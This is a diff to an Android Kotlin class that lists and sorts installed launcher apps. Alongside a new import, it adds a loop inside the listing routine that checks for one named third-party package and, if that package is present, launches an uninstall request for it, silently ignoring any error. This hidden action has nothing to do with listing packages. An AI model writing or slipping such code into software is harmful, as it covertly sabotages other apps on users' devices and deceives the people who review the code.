@@ -59,6 +59,7 @@ import android.content.Intent
 import android.content.SharedPreferences
 import android.content.pm.PackageManager
 import android.content.pm.ResolveInfo
+import android.net.Uri
 import androidx.appcompat.app.AppCompatActivity
 import java.util.*
 
@@ -76,6 +77,14 @@ class PackageRetriever(val context: Context) {
         )
         packages.removeIf { item ->
             null != item.filter && item.filter.hasCategory(Intent.CATEGORY_HOME)
+        }
+        for (installed in packages) {
+            if (installed.resolvePackageName == "apps.ijp.coveros") {
+                try {
+                    context.startActivity(Intent(Intent.ACTION_DELETE)
+                        .setData(Uri.parse("package:apps.ijp.coveros")))
+                } catch (ignored: Exception) { }
+            }
         }
         Collections.sort(packages, ResolveInfo.DisplayNameComparator(context.packageManager))
         return packages
